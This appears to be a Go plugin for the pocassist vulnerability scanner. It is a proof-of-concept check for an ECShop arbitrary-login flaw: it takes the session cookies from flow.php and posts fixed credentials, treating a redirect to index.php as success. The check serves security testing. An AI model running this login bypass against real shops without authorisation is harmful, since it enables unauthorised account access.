package scripts

import (
	"github.com/jweny/pocassist/pkg/cel/proto"
	"github.com/jweny/pocassist/pkg/util"
	"github.com/valyala/fasthttp"
	"strings"
)

// EcshopAnyoneLoginVul ecshop 任意登录
func EcshopAnyoneLoginVul(args *ScriptScanArgs) (*util.ScanResult, error) {

	// 定义报文列表
	var respList []*proto.Response

	rawUrl := ConstructUrl(args, "/flow.php?step=login")
	fastReq := fasthttp.AcquireRequest()
	defer fasthttp.ReleaseRequest(fastReq)
	fastReq.Header.SetMethod("HEAD")
	fastReq.SetRequestURI(rawUrl)
	// no redirect
	resp1, err := util.DoFasthttpRequest(fastReq, false)
	if err != nil {
		util.ResponsePut(resp1)
		// failed to fastReq
		return nil, err
	}
	containECSID := false
	// 重置 fastReq，为下面 SetCookie 请求作准备
	fastReq.Reset()
	for key, value := range resp1.Headers{
		if strings.Contains(value,"ECS_ID") {
			containECSID = true
		}
		cookie := fasthttp.AcquireCookie()
		defer fasthttp.ReleaseCookie(cookie)

		err := cookie.Parse(value)
		if err == nil {
			fastReq.Header.SetCookie(key, string(cookie.Value()))
		}
	}

	if containECSID {
		// cookie 包含 ECS_ID，尝试登陆
		fastReq.SetRequestURI(rawUrl)
		fastReq.Header.SetMethod(fasthttp.MethodPost)
		fastReq.Header.SetContentType("text/html")

		postData := fasthttp.AcquireArgs()
		defer fasthttp.ReleaseArgs(postData)
		postData.Add("username", "ecshop")
		postData.Add("paord", "ssssss")
		postData.Add("login", "%B5%C7%C2%BC")
		postData.Add("act", "signin")
		fastReq.SetBody(postData.QueryString())

		resp2, err := util.DoFasthttpRequest(fastReq,false)
		if err != nil {
			// failed to fastReq
			return nil, err
		}
		if resp2.Status == 302 &&
			strings.Contains(resp2.Headers["Location"],"index.php") {
			respList = append(respList, resp1)
			respList = append(respList, resp2)
			return util.VulnerableHttpResult(rawUrl,"", respList),nil
		}
		util.ResponsePut(resp2)
	}
	util.ResponsePut(resp1)
	return &util.InVulnerableResult, nil
}

func init() {
	ScriptRegister("poc-go-ecshop-anyone-login", EcshopAnyoneLoginVul)
}